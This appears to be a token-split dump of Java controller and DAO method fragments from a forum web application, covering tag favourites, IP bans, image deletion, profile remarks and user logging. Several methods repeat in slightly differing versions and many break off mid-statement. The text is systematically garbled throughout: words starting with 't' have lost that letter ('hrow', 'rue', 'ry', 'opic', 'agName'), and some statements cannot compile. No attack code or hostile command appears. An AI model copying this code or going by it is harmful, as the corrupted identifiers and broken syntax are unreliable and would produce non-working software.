public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String agName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = Template . getCurrentUser ( ) ; user . checkAnonymous ( ) ; List < String > r = userTagService . addMultiplyTags ( user , agName , rue ) ; if ( ! r . isEmpty ( ) ) { ModelAndView modelAndView = showList ( request , agName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , Object > favoriteTagAddJSON ( HttpServletRequest request , @RequestParam String agName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = Template . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ry { int id = userTagService . favoriteAdd ( user , agName ) ; 
public ModelAndView favoriteTagDel ( ServletRequest request , @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = Template . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . favoriteDel ( user , agName ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
Map < String , Object > favoriteTagDelJSON ( ServletRequest request , @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = Template . getCurrentUser ( ) ; user . checkAnonymous ( ) ; int agId = userTagService . favoriteDel ( user , agName ) ; return ImmutableMap . of ( " count " , userTagService . countFavs ( agId ) ) ; } 
public ModelAndView showForm ( ServletRequest request ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } Template . getCurrentUser ( ) . checkFrozen ( ) ; return new ModelAndView ( " addphoto " ) ; } 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " ime " ) String ime , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) boolean allowPosting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) boolean captchaRequired ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( ime ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( ime ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( ime ) ) { } else if ( " custom " . equals ( ime ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { hrow new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp s ; if ( " unlim " . equals ( ime ) ) { s = null ; } else { s = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user . getId ( ) , reason , s , allowPosting , captchaRequired ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , StandardCharsets . UTF_8 ) ) ) ; } 
public ModelAndView showEditInfo ( @PathVariable ( " id " ) int msgid ) { Topic message = messageDao . getById ( msgid ) ; Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; PreparedTopic preparedMessage = opicPrepareService . prepareTopic ( message , AuthUtil . getCurrentUser ( ) ) ; opicPermissionService . checkView ( group , message , AuthUtil . getCurrentUser ( ) , preparedMessage . getAuthor ( ) , false ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( message ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , groupPermissionService . isEditable ( preparedMessage , AuthUtil . getCurrentUser ( ) ) ) ; return modelAndView ; } 
public ModelAndView deleteForm ( @RequestParam int id , HttpServletRequest request ) { Image image = imageDao . getImage ( id ) ; Topic opic = opicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( opic , AuthUtil . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , AuthUtil . getCurrentUser ( ) ) ; ModelAndView mv = new ModelAndView ( " delete_image " ) ; mv . addObject ( " image " , image ) ; mv . addObject ( " preparedTopic " , preparedTopic ) ; return mv ; } 
public RedirectView deleteImage ( @RequestParam int id , HttpServletRequest request ) { Image image = imageDao . getImage ( id ) ; Topic opic = opicDao . getById ( image . getTopicId ( ) ) ; PreparedTopic preparedTopic = prepareService . prepareTopic ( opic , AuthUtil . getCurrentUser ( ) ) ; checkDelete ( preparedTopic , AuthUtil . getCurrentUser ( ) ) ; imageService . deleteImage ( AuthUtil . getCurrentUser ( ) , image ) ; return new RedirectView ( TopicLinkBuilder . baseLink ( opic ) . forceLastmod ( ) . build ( ) ) ; } 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " ext " ) String ext , @PathVariable String nick ) { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } if ( ext . length ( ) > 255 ) { ext = ext . substring ( 0 , 255 ) ; } User user = AuthUtil . getCurrentUser ( ) ; User refUser = userService . getUserCached ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , ext ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarksJava ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userService . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String agName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; List < String > r = userTagService . addMultiplyTags ( user , agName , rue ) ; if ( ! r . isEmpty ( ) ) { ModelAndView modelAndView = showList ( request , agName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , Object > favoriteTagAddJSON ( HttpServletRequest request , @RequestParam String agName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ry { int id = userTagService . favoriteAdd ( user , agName ) ; 
public ModelAndView favoriteTagDel ( ServletRequest request , @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . favoriteDel ( user , agName ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
Map < String , Object > favoriteTagDelJSON ( ServletRequest request , @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; int agId = userTagService . favoriteDel ( user , agName ) ; return ImmutableMap . of ( " count " , userTagService . countFavs ( agId ) ) ; } 
public boolean followAuthorLinks ( User author ) { if ( author . isBlocked ( ) | | author . isAnonymous ( ) | | author . isFrozen ( ) ) { return false ; } return author . getScore ( ) > = LINK_FOLLOW_MIN_SCORE ; } 
public TopicController opicController ( SectionService sectionService , TopicDao messageDao , CommentPrepareService prepareService , TopicPrepareService opicPrepareService , CommentReadService commentService , IgnoreListDao ignoreListDao , SiteConfig siteConfig , IPBlockDao ipBlockDao , EditHistoryService editHistoryService , MemoriesDao memoriesDao , TopicPermissionService permissionService , MoreLikeThisService moreLikeThisService , TopicTagService opicTagService , MsgbaseDao msgbaseDao , MessageTextService extService , GroupDao groupDao ) { return new TopicController ( sectionService , messageDao , prepareService , opicPrepareService , commentService , ignoreListDao , siteConfig , ipBlockDao , editHistoryService , memoriesDao , permissionService , 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " ime " ) String ime , @RequestParam ( value = " allow_posting " , required = false , defaultValue = " false " ) boolean allowPosting , @RequestParam ( value = " captcha_required " , required = false , defaultValue = " false " ) boolean captchaRequired ) hrows Exception { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( ime ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( ime ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( ime ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( ime ) ) { } else if ( " custom " . equals ( ime ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { hrow new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp s ; if ( " unlim " . equals ( ime ) ) { s = null ; } else { s = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkCommit ( ) ; ipBlockDao . blockIP ( ip , user . getId ( ) , reason , s , allowPosting , captchaRequired ) ; return new ModelAndView ( new RedirectView ( " sameip.jsp?ip= " + URLEncoder . encode ( ip , StandardCharsets . UTF_8 ) ) ) ; } 
public ModelAndView showCommentsOld ( @PathVariable String nick ) { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } ModelAndView mv = new ModelAndView ( " deleted-comments " ) ; User user = userService . getUserCached ( nick ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " deletedList " , commentService . getDeletedComments ( user ) ) ; return mv ; } 
public ModelAndView showForm ( @RequestParam ( " group " ) int id ) { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } Group group = groupDao . getGroup ( id ) ; ModelAndView mv = new ModelAndView ( " groupmod " , " group " , group ) ; mv . getModel ( ) . put ( " groupInfo " , prepareService . prepareGroupInfo ( group ) ) ; return mv ; } 
public int doStartTag ( ) { Template = Template . getTemplate ( ) ; List < String > boxnames = ImmutableList . copyOf ( Iterables . filter ( . getProf ( ) . getBoxlets ( ) , DefaultProfile . boxPredicate ( ) : : est ) ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public ModelAndView changeTagShowFormHandler ( @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( " agName " ) String oldTagName ) hrows AccessViolationException { Template emplate = Template . getTemplate ( ) ; if ( ! emplate . isModeratorSession ( ) ) { hrow new AccessViolationException ( REJECT_REASON ) ; } TagRequest . Change agRequestChange = new TagRequest . Change ( ) ; agRequestChange . setOldTagName ( oldTagName ) ; agRequestChange . setTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " ags-change " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " agRequestChange " , agRequestChange ) ; return modelAndView ; } 
public ModelAndView deleteTagShowFormHandler ( @RequestParam ( value = " firstLetter " , required = false , defaultValue = " " ) String firstLetter , @RequestParam ( " agName " ) String oldTagName ) hrows AccessViolationException { Template emplate = Template . getTemplate ( ) ; if ( ! emplate . isModeratorSession ( ) ) { hrow new AccessViolationException ( REJECT_REASON ) ; } TagRequest . Delete agRequestDelete = new TagRequest . Delete ( ) ; agRequestDelete . setOldTagName ( oldTagName ) ; ModelAndView modelAndView = new ModelAndView ( " ags-delete " ) ; modelAndView . addObject ( " firstLetter " , firstLetter ) ; modelAndView . addObject ( " agRequestDelete " , agRequestDelete ) ; return modelAndView ; } 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @RequestParam ( value = " skipdeleted " , required = false , defaultValue = " false " ) boolean skipDeleted , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) { if ( cid ! = null ) { return jumpMessage ( msgid , cid , skipDeleted ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; boolean rss = request . getParameter ( " output " ) ! = null & & " rss " . equals ( request . getParameter ( " output " ) ) ; if ( rss ) { return getMessageRss ( section , response , groupName , msgid ) ; 
public ModelAndView jumpMessage ( @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) Integer cid ) { if ( cid ! = null ) { return jumpMessage ( msgid , cid , false ) ; } Topic opic = messageDao . getById ( msgid ) ; TopicLinkBuilder builder ; if ( page ! = null ) { builder = TopicLinkBuilder . pageLink ( opic , page ) ; } else { builder = TopicLinkBuilder . baseLink ( opic ) ; } return new ModelAndView ( new RedirectView ( builder . build ( ) ) ) ; } 
public ModelMap showRemove ( @RequestParam ( required = false ) Integer pos ) hrows AccessViolationException { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ModelMap result = new ModelMap ( ) ; EditBoxesRequest form = new EditBoxesRequest ( ) ; form . setPosition ( pos ) ; result . addAttribute ( " form " , form ) ; return result ; } 
public ModelAndView editProfile ( @RequestParam ( " ext " ) String ext , @PathVariable String nick ) { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } if ( ext . length ( ) > 255 ) { ext = ext . substring ( 0 , 255 ) ; } User user = AuthUtil . getCurrentUser ( ) ; User refUser = userService . getUserCached ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , ext ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public ModelAndView showModeratorForm ( @PathVariable String nick ) { User user = userService . getUser ( nick ) ; Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } ModelAndView modelAndView = new ModelAndView ( " confirm-password-reset " ) ; modelAndView . addObject ( " user " , user ) ; modelAndView . addObject ( " whoisLink " , UriComponentsBuilder . fromUriString ( " /people/{nick}/profile " ) . buildAndExpand ( nick ) . encode ( ) . oUriString ( ) ) ; return modelAndView ; } 
public ModelAndView showList ( @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarksJava ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
public ModelAndView listDel ( @RequestParam int id ) { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userService . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String agName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; List < String > r = userTagService . addMultiplyTags ( user , agName , rue ) ; if ( ! r . isEmpty ( ) ) { ModelAndView modelAndView = showList ( agName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , Object > favoriteTagAddJSON ( @RequestParam String agName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ry { int id = userTagService . favoriteAdd ( user , agName ) ; 
public ModelAndView favoriteTagDel ( @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; userTagService . favoriteDel ( user , agName ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
Map < String , Object > favoriteTagDelJSON ( @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; user . checkAnonymous ( ) ; int agId = userTagService . favoriteDel ( user , agName ) ; return ImmutableMap . of ( " count " , userTagService . countFavs ( agId ) ) ; } 
public void removeTown ( User user ) { jdbcTemplate . update ( " UPDATE users SET town=null WHERE id=? " , user . getId ( ) ) ; } 
public void removeUrl ( User user ) { jdbcTemplate . update ( " UPDATE users SET url=null WHERE id=? " , user . getId ( ) ) ; } 
public void logResetUrl ( @Nonnull User user , @Nonnull User moderator , @Nonnull String url , int bonus ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public void logResetTown ( @Nonnull User user , @Nonnull User moderator , @Nonnull String own , int bonus ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public void logRegister ( int userid , @Nonnull String ip , Optional < Integer > invitedBy ) { ImmutableMap < String , String > params ; params = invitedBy . map ( integer - > ImmutableMap . of ( OPTION_IP , ip , OPTION_INVITED_BY , integer . oString ( ) ) ) . orElseGet ( ( ) - > ImmutableMap . of ( OPTION_IP , ip ) ) ; jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public boolean isAuthorReadonly ( ) { return authorReadonly ; } 
public boolean isCommentsAllowed ( Group group , Topic opic , User user , boolean ignoreFrozen ) { if ( user ! = null & & ( user . isBlocked ( ) | | ( ! ignoreFrozen & & user . isFrozen ( ) ) ) ) { return false ; } if ( opic . isDeleted ( ) | | opic . isExpired ( ) | | opic . isDraft ( ) ) { return false ; } int score = getPostscore ( group , opic ) ; if ( score = = POSTSCORE_NO_COMMENTS | | score = = POSTSCORE_HIDE_COMMENTS ) { return false ; } if ( score = = POSTSCORE_UNRESTRICTED ) { return rue ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return rue ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return rue ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = opic . getAuthorUserId ( ) ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return rue ; 
public boolean isEnabled ( ) { return ! user . isBlocked ( ) & & ! user . isAnonymous ( ) ; } 
private ImmutableMap < String , Object > prepareModel ( @Nullable Group group , @Nullable User currentUser , int sectionId , HttpServletRequest request ) { ImmutableMap . Builder < String , Object > params = ImmutableMap . builder ( ) ; Section section = sectionService . getSection ( sectionId ) ; ry { URL helpResource = request . getServletContext ( ) . getResource ( " /help/new-topic- " + Section . getUrlName ( sectionId ) + " .md " ) ; if ( helpResource ! = null ) { String helpRawText = IOUtils . oString ( helpResource , StandardCharsets . UTF_8 ) ; String addInfo = renderService . renderToHtml ( helpRawText , false ) ; params . put ( " addportal " , addInfo ) ; } } catch ( IOException e ) { hrow new RuntimeException ( e ) ; } params . put ( " sectionId " , sectionId ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; params . put ( " showAllowAnonymous " , groupPermissionService . enableAllowAnonymousCheckbox ( group , currentUser ) ) ; params . put ( " imagepost " , groupPermissionService . isImagePostingAllowed ( section , currentUser ) ) ; } return params . build ( ) ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId , @RequestParam ( value = " ag " , required = false ) String ag , HttpServletRequest request ) hrows UserErrorException { Map < String , Object > params = new HashMap < > ( prepareModel ( null , AuthUtil . getCurrentUser ( ) , sectionId , request ) ) ; if ( ag ! = null ) { TagName . checkTag ( ag ) ; params . put ( " ag " , ag ) ; } Section section = sectionService . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
public SectionDao sectionDao ( DataSource ds ) { return new SectionDaoImpl ( ds ) ; } 
public boolean isBlockable ( ) { if ( id = = ANONYMOUS_ID | | blocked ) { return false ; } return ! canmod ; } 
public ModelAndView showList ( @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarksJava ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
public ModelAndView listDel ( @RequestParam int id ) { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; User delUser = userService . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public ModelAndView favoriteTagAddHTML ( HttpServletRequest request , @RequestParam String agName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; List < String > r = userTagService . addMultiplyTags ( user , agName , rue ) ; if ( ! r . isEmpty ( ) ) { ModelAndView modelAndView = showList ( agName , null ) ; modelAndView . addObject ( " favoriteTagAddError " , r ) ; return modelAndView ; } return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public Map < String , Object > favoriteTagAddJSON ( @RequestParam String agName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; ry { int id = userTagService . favoriteAdd ( user , agName ) ; 
public ModelAndView favoriteTagDel ( @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; userTagService . favoriteDel ( user , agName ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
Map < String , Object > favoriteTagDelJSON ( @RequestParam String agName ) hrows TagNotFoundException , AccessViolationException { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; int agId = userTagService . favoriteDel ( user , agName ) ; return ImmutableMap . of ( " count " , userTagService . countFavs ( agId ) ) ; } 
private ImmutableMap < String , Object > prepareModel ( @Nullable Group group , @Nullable User currentUser , int sectionId , HttpServletRequest request ) { ImmutableMap . Builder < String , Object > params = ImmutableMap . builder ( ) ; Section section = sectionService . getSection ( sectionId ) ; ry { URL helpResource = request . getServletContext ( ) . getResource ( " /help/new-topic- " + Section . getUrlName ( sectionId ) + " .md " ) ; if ( helpResource ! = null ) { String helpRawText = IOUtils . oString ( helpResource , StandardCharsets . UTF_8 ) ; String addInfo = renderService . renderToHtml ( helpRawText , false ) ; params . put ( " addportal " , addInfo ) ; } } catch ( IOException e ) { hrow new RuntimeException ( e ) ; } params . put ( " sectionId " , sectionId ) ; params . put ( " section " , section ) ; if ( group ! = null ) { params . put ( " group " , group ) ; params . put ( " postscoreInfo " , groupPermissionService . getPostScoreInfo ( group ) ) ; params . put ( " showAllowAnonymous " , groupPermissionService . enableAllowAnonymousCheckbox ( group , currentUser ) ) ; params . put ( " imagepost " , groupPermissionService . 